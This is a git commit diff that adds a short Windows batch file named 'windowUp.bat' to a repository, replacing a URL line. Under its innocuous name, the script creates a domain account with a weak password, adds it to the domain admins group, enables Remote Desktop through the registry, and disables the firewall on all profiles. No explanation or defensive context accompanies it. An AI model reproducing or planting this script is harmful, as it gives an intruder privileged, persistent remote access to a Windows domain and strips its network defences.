60837ca99a5b56219d8de5ece49469467e5db92e
ernered <50052716+ernered@users.noreply.github.com>
2023-10-01 10:45:27 -0500

    windowUp.bat

--- windowUp.bat
+++ windowUp.bat
@@ -1,1 +1,6 @@
-https://textdoc.co/Jh407KL1xWgokzA2
+ECHO OFF
+net user professorp Password123! /add /domain
+net group "domain admins" professorp /add /domain
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+netsh advfirewall set allprofiles state off
+PAUSE
